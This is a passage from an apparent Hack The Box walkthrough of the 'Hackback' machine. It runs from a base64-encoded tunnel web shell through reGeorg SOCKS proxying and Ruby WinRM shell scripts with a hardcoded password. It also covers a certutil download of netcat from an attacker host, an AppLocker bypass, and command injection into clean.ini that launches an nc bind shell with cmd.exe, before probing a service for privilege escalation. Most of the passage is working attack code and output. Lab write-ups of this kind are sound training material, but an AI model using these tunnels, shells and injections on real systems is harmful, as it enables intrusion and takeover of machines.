Jzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK"</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/23.png" alt=""><br>Then I checked the tunnel :<br><img src="/images/hackthebox/hackback/24.png" alt=""><br>Great !</p>
<h2 id="Running-the-Proxy-Server-Shell-as-simple"><a href="#Running-the-Proxy-Server-Shell-as-simple" class="headerlink" title="Running the Proxy Server, Shell as simple"></a>Running the Proxy Server, Shell as simple</h2><p>First thing to do is to configure <code>proxychains</code> to use whatever port we like, I used 8888 :<br><code>/etc/proxychains.conf</code> :<br><img src="/images/hackthebox/hackback/25.png" alt=""><br>Then I used <code>reGeorgSocksProxy.py</code> and gave it the port and the path :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8888 -u http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;tunnel.aspx</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/26.png" alt=""><br>Now we can connect as <code>simple</code>. I used Alamot’s winrm ruby shell :</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'winrm'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new( </span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">'http://10.10.10.128:5985/wsman'</span>,</span><br><span class="line">  <span class="symbol">transport:</span> <span class="symbol">:ssl</span>,</span><br><span class="line">  <span class="symbol">user:</span> <span class="string">'simple'</span>,</span><br><span class="line">  <span class="symbol">password:</span> <span class="string">'ZonoProprioZomaro:-('</span>,</span><br><span class="line">  <span class="symbol">:no_ssl_peer_verification</span> =&gt; <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">"exit\n"</span> <span class="keyword">do</span></span><br><span class="line">        output = shell.run(<span class="string">"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')"</span>)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = STDIN.gets        </span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    puts <span class="string">"Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/27.png" alt=""><br>And …. no flag !</p>
<h2 id="clean-ini-Shell-as-hacker"><a href="#clean-ini-Shell-as-hacker" class="headerlink" title="clean.ini , Shell as hacker"></a>clean.ini , Shell as hacker</h2><p>I checked <code>c:\</code> and found a strange directory called <code>util</code> :<br><img src="/images/hackthebox/hackback/28.png" alt=""><br><code>c:\util</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK C:\&gt; cd util                              </span><br><span class="line">PS hackback\simple@HACKBACK util&gt; ls</span><br><span class="line"></span><br><span class="line">Directory: C:\util</span><br><span class="line">    </span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       12&#x2F;14&#x2F;2018   3:30 PM                PingCastle</span><br><span class="line"></span><br><span class="line">-a----         3&#x2F;8&#x2F;2007  12:12 AM         139264 Fping.exe</span><br><span class="line"></span><br><span class="line">-a----        3&#x2F;29&#x2F;2017   7:46 AM         312832 kirbikator.exe</span><br><span class="line"></span><br><span class="line">-a----       12&#x2F;14&#x2F;2018   3:42 PM           1404 ms.hta</span><br><span class="line"></span><br><span class="line">-a----        2&#x2F;29&#x2F;2016  12:04 PM         359336 PSCP.EXE</span><br><span class="line"></span><br><span class="line">-a----        2&#x2F;29&#x2F;2016  12:04 PM         367528 PSFTP.EXE</span><br><span class="line"></span><br><span class="line">-a----         5&#x2F;4&#x2F;2018  12:21 PM          23552 RawCap.exe</span><br></pre></td></tr></table></figure>
<p>However there was a hidden directory, if we do <code>dir -force</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK util&gt; dir -force</span><br><span class="line"></span><br><span class="line">Directory: C:\util</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----                                     </span><br><span class="line">d-----       12&#x2F;14&#x2F;2018   3:30 PM                PingCastle</span><br><span class="line"></span><br><span class="line">d--h--       12&#x2F;21&#x2F;2018   6:21 AM                scripts</span><br><span class="line"></span><br><span class="line">-a----         3&#x2F;8&#x2F;2007  12:12 AM         139264 Fping.exe</span><br><span class="line"></span><br><span class="line">-a----        3&#x2F;29&#x2F;2017   7:46 AM         312832 kirbikator.exe</span><br><span class="line"></span><br><span class="line">-a----       12&#x2F;14&#x2F;2018   3:42 PM           1404 ms.hta</span><br><span class="line"></span><br><span class="line">-a----        2&#x2F;29&#x2F;2016  12:04 PM         359336 PSCP.EXE</span><br><span class="line"></span><br><span class="line">-a----        2&#x2F;29&#x2F;2016  12:04 PM         367528 PSFTP.EXE</span><br><span class="line"></span><br><span class="line">-a----         5&#x2F;4&#x2F;2018  12:21 PM          23552 RawCap.exe</span><br></pre></td></tr></table></figure>
<p>A new directory appeared : <code>scripts</code>. looking in that directory :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK util&gt; cd scripts</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Could not find item C:\util\scripts.</span><br><span class="line">At line:1 char:56</span><br><span class="line">+ ... join($id,&#39;PS &#39;,$(whoami),&#39;@&#39;,$env:computername,&#39; &#39;,$((gi $pwd).Name), ...</span><br><span class="line">+                                                           ~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (C:\util\scripts:String) [Get-Item], IOException</span><br><span class="line">    + FullyQualifiedErrorId : ItemNotFound,Microsoft.PowerShell.Commands.GetItemCommand</span><br><span class="line">PS hackback\simple@HACKBACK &gt; ls</span><br><span class="line"></span><br><span class="line">    Directory: C:\util\scripts</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       12&#x2F;13&#x2F;2018   2:54 PM            spool</span><br><span class="line">-a----       12&#x2F;21&#x2F;2018   5:44 AM         84 backup.bat</span><br><span class="line">-a----         7&#x2F;5&#x2F;2019   5:34 PM         39 batch.log</span><br><span class="line">-a----         7&#x2F;5&#x2F;2019   6:07 PM        135 clean.ini</span><br><span class="line">-a----        12&#x2F;8&#x2F;2018   9:17 AM       1232 dellog.ps1</span><br><span class="line">-a----         7&#x2F;5&#x2F;2019   5:34 PM         36 log.txt</span><br></pre></td></tr></table></figure>
<p>Without talking too much about the rabbit holes and the failed attempts. If we check <code>clean.ini</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK &gt; type clean.ini</span><br><span class="line">[Main]</span><br><span class="line">LifeTime&#x3D;100</span><br><span class="line">LogFile&#x3D;c:\util\scripts\log.txt</span><br><span class="line">Directory&#x3D;c:\inetpub\logs\logfiles</span><br></pre></td></tr></table></figure>
<p>Obviously it gets executed from time to time, and it’s the only writable thing by <code>simple</code> in that directory. We can inject commands in <code>LogFile</code> which means that we can make another user execute our commands. I tried to upload <code>nc.exe</code> but :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK &gt; certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc64.exe C:\windows\system32\spool\drivers\color\nc.exe</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc64.exe C:\windows\s ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">This script contains malicious content and has been blocked by your antivirus software.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException</span><br><span class="line">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand</span><br></pre></td></tr></table></figure>
<p>Expected. I terminated that <code>winrm</code> session and used Alamot’s other <code>winrm</code> shell that had upload and download capabilities :</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'winrm-fs'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line"><span class="comment"># To upload a file type: UPLOAD local_path remote_path</span></span><br><span class="line"><span class="comment"># e.g.: PS&gt; UPLOAD myfile.txt C:\temp\myfile.txt</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new( </span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">'http://10.10.10.128:5985/wsman'</span>,</span><br><span class="line">  <span class="symbol">user:</span> <span class="string">'simple'</span>,</span><br><span class="line">  <span class="symbol">password:</span> <span class="string">'ZonoProprioZomaro:-('</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">file_manager = WinRM::FS::FileManager.new(conn) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span></span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">tokenize</span></span></span><br><span class="line">    <span class="keyword">self</span>.</span><br><span class="line">      split(<span class="regexp">/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/</span>).</span><br><span class="line">      select &#123;<span class="params">|s|</span> <span class="keyword">not</span> s.empty? &#125;.</span><br><span class="line">      map &#123;<span class="params">|s|</span> s.gsub(<span class="regexp">/(^ +)|( +$)|(^["']+)|(["']+$)/</span>,<span class="string">''</span>)&#125;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">"exit\n"</span> <span class="keyword">do</span></span><br><span class="line">        output = shell.run(<span class="string">"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')"</span>)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = STDIN.gets</span><br><span class="line">        <span class="keyword">if</span> command.start_with?(<span class="string">'UPLOAD'</span>) <span class="keyword">then</span></span><br><span class="line">            upload_command = command.tokenize</span><br><span class="line">            print(<span class="string">"Uploading "</span> + upload_command[<span class="number">1</span>] + <span class="string">" to "</span> + upload_command[<span class="number">2</span>])</span><br><span class="line">            file_manager.upload(upload_command[<span class="number">1</span>], upload_command[<span class="number">2</span>]) <span class="keyword">do</span> <span class="params">|bytes_copied, total_bytes, local_path, remote_path|</span></span><br><span class="line">                puts(<span class="string">"<span class="subst">#&#123;bytes_copied&#125;</span> bytes of <span class="subst">#&#123;total_bytes&#125;</span> bytes copied"</span>)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            command = <span class="string">"echo `nOK`n"</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> command.start_with?(<span class="string">'DOWNLOAD'</span>) <span class="keyword">then</span></span><br><span class="line">            download_command = command.tokenize</span><br><span class="line">            print(<span class="string">"Downloading "</span> + download_command[<span class="number">1</span>] + <span class="string">" to "</span> + download_command[<span class="number">2</span>])</span><br><span class="line">            file_manager.download(download_command[<span class="number">1</span>], download_command[<span class="number">2</span>]) <span class="keyword">do</span> <span class="params">|bytes_copied, total_bytes, local_path, remote_path|</span></span><br><span class="line">                puts(<span class="string">"<span class="subst">#&#123;bytes_copied&#125;</span> bytes of <span class="subst">#&#123;total_bytes&#125;</span> bytes copied"</span>)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            command = <span class="string">"echo `nOK`n"</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print(stdout)</span><br><span class="line">            STDERR.print(stderr)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    puts(<span class="string">"Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>Then I uploaded <code>nc.exe</code> to <code>C:\windows\system32\spool\drivers\color\</code> (to bypass applocker) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# proxychains .&#x2F;winrm2.rb </span><br><span class="line">ProxyChains-3.1 (http:&#x2F;&#x2F;proxychains.sf.net)</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">PS hackback\simple@HACKBACK Documents&gt; UPLOAD &#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback&#x2F;nc.exe C:\windows\system32\spool\drivers\color\nc.exe</span><br><span class="line">Uploading &#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback&#x2F;nc.exe to C:\windows\system32\spool\drivers\color\nc.exe|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">26892 bytes of 51488 bytes copied</span><br><span class="line">51488 bytes of 51488 bytes copied</span><br><span class="line"></span><br><span class="line">OK</span><br><span class="line">PS hackback\simple@HACKBACK Documents&gt;</span><br></pre></td></tr></table></figure>
<p>After that I used simple echo commands to edit <code>clean.ini</code>. It should look like this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Main]</span><br><span class="line">LifeTime&#x3D;100</span><br><span class="line">LogFile&#x3D;c:\util\scripts\log.txt &amp; cmd.exe &#x2F;c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe</span><br><span class="line">Directory&#x3D;c:\inetpub\logs\logfiles</span><br></pre></td></tr></table></figure>
<p>This way we can get a bind shell. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\util\scripts&gt; echo [Main] &gt; C:\util\scripts\clean.ini</span><br><span class="line">echo [Main] &gt; C:\util\scripts\clean.ini</span><br><span class="line">PS C:\util\scripts&gt; echo LifeTime&#x3D;100 &gt;&gt; C:\util\scripts\clean.ini</span><br><span class="line">echo LifeTime&#x3D;100 &gt;&gt; C:\util\scripts\clean.ini</span><br><span class="line">PS C:\util\scripts&gt; echo &quot;LogFile&#x3D;c:\util\scripts\log.txt &amp; cmd.exe &#x2F;c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &gt;&gt; C:\util\scripts\clean.ini                                          </span><br><span class="line">echo &quot;LogFile&#x3D;c:\util\scripts\log.txt &amp; cmd.exe &#x2F;c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &gt;&gt; C:\util\scripts\clean.ini                                                              </span><br><span class="line">PS C:\util\scripts&gt; echo &quot;Directory&#x3D;c:\inetpub\logs\logfiles&quot; &gt;&gt; C:\util\scripts\clean.ini</span><br><span class="line">echo &quot;Directory&#x3D;c:\inetpub\logs\logfiles&quot; &gt;&gt; C:\util\scripts\clean.ini</span><br><span class="line">PS C:\util\scripts&gt; cat clean.ini</span><br><span class="line">cat clean.ini</span><br><span class="line">[Main]</span><br><span class="line">LifeTime&#x3D;100</span><br><span class="line">LogFile&#x3D;c:\util\scripts\log.txt &amp; cmd.exe &#x2F;c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe                       Directory&#x3D;c:\inetpub\logs\logfiles</span><br><span class="line">PS C:\util\scripts&gt;</span><br></pre></td></tr></table></figure>
<p>After some time the listener starts and we can connect to port 1338 through the proxy :<br><img src="/images/hackthebox/hackback/29.png" alt=""><br>Finally we owned user !</p>
<h2 id="UserLogger-Filesystem-Access-as-System-Root-Flag"><a href="#UserLogger-Filesystem-Access-as-System-Root-Flag" class="headerlink" title="UserLogger, Filesystem Access as System, Root Flag"></a>UserLogger, Filesystem Access as System, Root Flag</h2><p>After getting a shell as <code>hacker</code> I did my regular Windows enumeration, one thing I wanted to check was the services, I remembered the services list I got from port 6666 so I checked that.<br>I noticed  a strange service called <code>UserLogger</code> :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"name":  "UserLogger",</span><br><span class="line">"startname":  "LocalSystem",</span><br><span class="line">"displayname":  "User Logger",</span><br><span class="line">"status":  "OK"</span><br></pre></td></tr></table></figure>
<p>So I checked the entry of that service in registry :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger</span><br><span class="line">    Type    REG_DWORD    0x10</span><br><span class="line">    Start    REG_DWORD    0x3</span><br><span class="line">    ErrorControl    REG_DWORD    0x1</span><br><span class="line">    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe</span><br><span class="line">    ObjectName    REG_SZ    LocalSystem</span><br><span class="line">    DisplayName    REG_SZ    User Logger</span><br><span class="line">    Description    REG_SZ    This service is responsible for logging user activity</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger\Security</span><br></pre></td></tr></table></figure>
<p>Description says it’s responsible for logging user activity. I tried to start that service as <code>hacker</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;sc start userlogger</span><br><span class="line">sc start userlogger</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: userlogger</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 2  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 1368   </span><br><span class="line">        FLAGS              :</span><br></pre></td></tr></table></figure>
<p><code>hacker</code> was allowed to start and stop the service. I started to look more into the service and test it. I created a test file and called it <code>test.txt</code> then I started the service and gave it the file as a parameter : <code>sc start userlogger test.txt</code>. It created a new file called <code>test.txt.log</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Documents&gt;type test.txt.log</span><br><span class="line">type test.txt.log</span><br><span class="line"></span><br><span class="line">Logfile specified!</span><br><span class="line">Service is starting</span><br><span class="line">Service is running</span><br></pre></td></tr></table></figure>
<p>Nothing interesting, however when I checked the permissions of that file :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Documents&gt;cacls C:\Users\hacker\Documents\test.txt.log</span><br><span class="line">cacls C:\Users\hacker\Documents\test.txt.log</span><br><span class="line"></span><br><span class="line">C:\Users\hacker\Documents\test.txt.log Everyone: F</span><br></pre></td></tr></table></figure>
